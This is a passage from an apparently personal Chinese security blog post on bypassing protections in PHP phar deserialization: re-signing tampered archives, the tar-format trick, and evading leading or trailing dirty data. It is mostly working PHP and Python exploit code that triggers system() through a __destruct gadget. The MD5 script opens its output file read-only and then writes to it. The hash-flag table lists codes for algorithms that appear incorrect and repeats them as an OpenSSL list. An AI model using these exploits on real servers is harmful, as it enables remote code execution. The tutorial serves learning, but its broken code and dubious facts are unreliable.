+</span></span><span class=line><span class=cl>   
+</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>f</span><span class=p>[:</span><span class=o>-</span><span class=mi>28</span><span class=p>]</span> <span class=c1># 获取要签名的数据</span>
+</span></span><span class=line><span class=cl><span class=n>h</span> <span class=o>=</span> <span class=n>f</span><span class=p>[</span><span class=o>-</span><span class=mi>8</span><span class=p>:]</span> <span class=c1># 获取签名类型和GBMB标识</span>
+</span></span><span class=line><span class=cl><span class=n>newf</span> <span class=o>=</span> <span class=n>s</span> <span class=o>+</span> <span class=n>sha1</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span> <span class=o>+</span> <span class=n>h</span> <span class=c1># 数据 + 签名 + (类型 + GBMB)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;newtest.phar&#39;</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>file</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>newf</span><span class=p>)</span> <span class=c1># 写入新文件</span>
+</span></span></code></pre></td></tr></table></div></div><p>那么这里仅仅只是SHA1算法，其他算法其实仅仅只是需要改变切片的长度即可</p><ol><li><strong>MD5</strong>：<ul><li>标志：<code>01</code></li><li>输出长度：16 字节（128 位）</li></ul></li><li><strong>SHA-1</strong>：<ul><li>标志：<code>02</code></li><li>输出长度：20 字节（160 位）</li></ul></li><li><strong>SHA-256</strong>：<ul><li>标志：<code>03</code></li><li>输出长度：32 字节（256 位）</li></ul></li><li><strong>SHA-512</strong>：<ul><li>标志：<code>04</code></li><li>输出长度：64 字节（512 位）</li></ul></li><li><strong>SHA-384</strong>：<ul><li>标志：<code>05</code></li><li>输出长度：48 字节（384 位）</li></ul></li><li><strong>SHA-224</strong>：<ul><li>标志：<code>06</code></li><li>输出长度：28 字节（224 位）</li></ul></li><li><strong>MD4</strong>：<ul><li>标志：<code>07</code></li><li>输出长度：16 字节（128 位）</li></ul></li><li><strong>MD2</strong>：<ul><li>标志：<code>08</code></li><li>输出长度：16 字节（128 位）</li></ul></li><li><strong>RIPEMD-160</strong>：<ul><li>标志：<code>09</code></li><li>输出长度：20 字节（160 位）</li></ul></li></ol><p><strong>OpenSSL 支持的哈希算法</strong></p><p>OpenSSL 是一个广泛的加密库，支持多种哈希算法。以下是一些常见的 OpenSSL 哈希算法及其标志和输出长度：</p><ul><li><strong>MD5</strong>：<ul><li>标志：<code>01</code></li><li>输出长度：16 字节（128 位）</li></ul></li><li><strong>SHA-1</strong>：<ul><li>标志：<code>02</code></li><li>输出长度：20 字节（160 位）</li></ul></li><li><strong>SHA-256</strong>：<ul><li>标志：<code>03</code></li><li>输出长度：32 字节（256 位）</li></ul></li><li><strong>SHA-512</strong>：<ul><li>标志：<code>04</code></li><li>输出长度：64 字节（512 位）</li></ul></li><li><strong>SHA-384</strong>：<ul><li>标志：<code>05</code></li><li>输出长度：48 字节（384 位）</li></ul></li><li><strong>SHA-224</strong>：<ul><li>标志：<code>06</code></li><li>输出长度：28 字节（224 位）</li></ul></li><li><strong>MD4</strong>：<ul><li>标志：<code>07</code></li><li>输出长度：16 字节（128 位）</li></ul></li><li><strong>MD2</strong>：<ul><li>标志：<code>08</code></li><li>输出长度：16 字节（128 位）</li></ul></li><li><strong>RIPEMD-160</strong>：<ul><li>标志：<code>09</code></li><li>输出长度：20 字节（160 位）</li></ul></li></ul><p>比如说md5 可以这么写</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>md5</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;./phar.phar&#39;</span><span class=p>,</span><span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>f</span><span class=o>=</span><span class=n>file</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>=</span><span class=n>f</span><span class=p>[:</span><span class=o>-</span><span class=mi>24</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>h</span><span class=o>=</span><span class=n>f</span><span class=p>[</span><span class=o>-</span><span class=mi>8</span><span class=p>:]</span>
+</span></span><span class=line><span class=cl><span class=n>newf</span><span class=o>=</span><span class=n>s</span><span class=o>+</span><span class=n>md5</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span><span class=o>+</span><span class=n>h</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;./newtest.phar&#39;</span><span class=p>,</span><span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>file</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>newf</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=tar绕过>tar绕过</h3><p>还有当使用tar文件来触发的时候，其实没有签名，此时可以直接绕过，就是很酷爽</p><h2 id=gc机制>GC机制</h2><p>这个直接将文件放在010中修改一下，然后把签名修复就可以了</p><h2 id=脏数据>脏数据</h2><h3 id=已知头部可控>已知头部(可控)</h3><p>直接加进去然后重新签名即可</p><h3 id=已知头部不可控>已知头部(不可控)</h3><p>我们直接提前写入脏数据然后把脏数据删除即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>flag</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$code</span><span class=o>=</span><span class=s2>&#34;whoami&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>unlink</span><span class=p>(</span><span class=s2>&#34;phar.phar&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>unlink</span><span class=p>(</span><span class=s2>&#34;poc.phar&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>flag</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=c1>//前面的脏数据
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$dirtydata</span> <span class=o>=</span> <span class=s2>&#34;dirty&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Phar</span><span class=p>(</span><span class=s2>&#34;phar.phar&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>startBuffering</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setStub</span><span class=p>(</span><span class=nv>$dirtydata</span><span class=o>.</span><span class=s2>&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setMetadata</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=c1>//下面$dirtydata是可以自定义的
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>addFromString</span><span class=p>(</span><span class=s2>&#34;anything&#34;</span> <span class=p>,</span> <span class=s2>&#34;test&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>stopBuffering</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nv>$exp</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;./phar.phar&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$post_exp</span> <span class=o>=</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$exp</span><span class=p>,</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$dirtydata</span><span class=p>));</span>
+</span></span><span class=line><span class=cl><span class=nv>$exp</span> <span class=o>=</span> <span class=nx>file_put_contents</span><span class=p>(</span><span class=s2>&#34;./poc.phar&#34;</span><span class=p>,</span><span class=nv>$post_exp</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=nx>show_source</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>flag</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$code</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=nx>system</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>code</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nv>$dirty</span><span class=o>=</span><span class=s2>&#34;dirty&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$old</span><span class=o>=</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;./poc.phar&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$new</span><span class=o>=</span><span class=nv>$dirty</span><span class=o>.</span><span class=nv>$old</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nx>file_put_contents</span><span class=p>(</span><span class=s2>&#34;./new.phar&#34;</span><span class=p>,</span><span class=nv>$new</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>file_exists</span><span class=p>(</span><span class=s2>&#34;phar://./new.phar&#34;</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>可能看起来很简单，但是对于我来说真是非常的来之不易</p><h3 id=绕过尾部脏数据不可控>绕过尾部脏数据(不可控)</h3><p>利用tar文件的暂停解析位来进行尾部脏数据的绕过</p><p>首先tar文件结构</p><ol><li><strong>头部（Header）</strong>：<ul><li>每个文件或目录在 tar 文件中都有一个 512 字节的头部。</li><li>头部包含文件的元数据，如文件名、大小、权限、所有者等。</li></ul></li><li><strong>数据块（Data Block）</strong>：<ul><li>文件的实际数据紧跟在其头部之后。</li><li>数据块的大小可以变化，但通常是 512 字节的倍数。</li></ul></li><li><strong>填充（Padding）</strong>：<ul><li>如果文件数据的长度不是 512 字节的倍数，tar 文件会在文件数据后面添加填充字节，使其长度变为 512 字节的倍数。</li></ul></li><li><strong>结束标记（End Marker）</strong>：<ul><li>tar 文件的末尾通常有两个连续的 512 字节的全零块，表示文件的结束。</li></ul></li></ol><p>诶那么如果此时块中数据不符合预期的话，tar 解析器可能会停止解析该块及其后续的数据，即为暂停解析位，那么我们如果要绕过文件尾部脏数据的话，就直接利用<code>tar</code>文件就可以了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>flag</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$code</span><span class=o>=</span><span class=s2>&#34;whoami&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>unlink</span><span class=p>(</span><span class=s2>&#34;phar.tar&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>unlink</span><span class=p>(</span><span class=s2>&#34;poc.tar&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>flag</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>PharData</span><span class=p>(</span><span class=nx>dirname</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>)</span> <span class=o>.</span> <span class=s2>&#34;/phar.tar&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;phartest&#34;</span><span class=p>,</span> <span class=nx>Phar</span><span class=o>::</span><span class=na>TAR</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>startBuffering</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setMetadata</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=c1>//下面$dirtydata是可以自定义的
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>addFromString</span><span class=p>(</span><span class=s2>&#34;anything&#34;</span> <span class=p>,</span> <span class=s2>&#34;test&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>stopBuffering</span><span class=p>();</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=nx>show_source</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>flag</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$code</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=nx>system</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>code</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nv>$dirty</span><span class=o>=</span><span class=s2>&#34;dirty&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$old</span><span class=o>=</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;./phar.tar&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$new</span><span class=o>=</span><span class=nv>$old</span><span class=o>.</span><span class=nv>$dirty</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nx>file_put_contents</span><span class=p>(</span><span class=s2>&#34;./new.tar&#34;</span><span class=p>,</span><span class=nv>$new</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>file_exists</span><span class=p>(</span><span class=s2>&#34;phar://./new.tar&#34;</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/phar-deserialization-bypass/QQ20241014-163845.png width=1656 height=915 loading=lazy alt=1></p><p>就这样就绕过了，成功解析</p><h3 id=头尾一起>头尾一起</h3><p>一样的方法</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>flag</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$code</span><span class=o>=</span><span class=s2>&#34;whoami&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>unlink</span><span class=p>(</span><span class=s2>&#34;phar.tar&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>unlink</span><span class=p>(</span><span class=s2>&#34;poc.tar&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>flag</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=c1>//前面的脏数据
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$dirtydata</span> <span class=o>=</span> <span class=s2>&#34;dirty&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>PharData</span><span class=p>(</span><span class=nx>dirname</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>)</span> <span class=o>.</span> <span class=s2>&#34;/phar.tar&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;phartest&#34;</span><span class=p>,</span> <span class=nx>Phar</span><span class=o>::</span><span class=na>TAR</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>startBuffering</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setMetadata</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=c1>//下面$dirtydata是可以自定义的
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>addFromString</span><span class=p>(</span><span class=nv>$dirtydata</span> <span class=p>,</span> <span class=s2>&#34;test&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>stopBuffering</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nv>$exp</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;./phar.tar&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$post_exp</span> <span class=o>=</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$exp</span><span class=p>,</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$dirtydata</span><span class=p>));</span>
+</span></span><span class=line><span class=cl><span class=nv>$exp</span> <span class=o>=</span> <span class=nx>file_put_contents</span><span class=p>(</span><span class=s2>&#34;./poc.tar&#34;</span><span class=p>,</span><span class=nv>$post_exp</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=nx>show_source</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>flag</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$code</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=nx>system</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>code</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nv>$front</span><span class=o>=</span><span class=s2>&#34;dirty&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$dirty</span><span class=o>=</span><span class=s2>&#34;dirty&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$old</span><span class=o>=</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;./poc.tar&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$new</span><span class=o>=</span><span class=nv>$front</span><span class=o>.</span><span class=nv>$old</span><span class=o>.</span><span class=nv>$dirty</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nx>file_put_contents</span><span class=p>(</span><span class=s2>&#34;./new.tar&#34;</span><span class=p>,</span><span class=nv>$new</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>file_exists</span><span class=p>(</span><span class=s2>&#34;phar://./new.tar&#34;</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><h1 id=0x03-小结>0x03 小结</h1><p>终于把这些知识点看完了，开始学习php审计，把之前欠下来的<code>demo</code>做了</p></section><footer class=article-footer><section class=article-tags><a href=/tags/phar/>Phar</a>
+<a href=/tags/%E5%A7%BF%E5%8A%BF/>姿势</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
+2024 -
+2026 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> and adapted by <a href=https://github.com/baozongwi target=_blank rel=noopener>baozongwi</a><br>Total words across posts: 430.4k<br></section></footer></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.5aa3eabb86128d5119136440a67650fd512b617c9557f2a5948a74012c5f2943.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><button id=back-to-top class=back-to-top aria-label=回到顶部 title=回到顶部>↑</button></body></html>
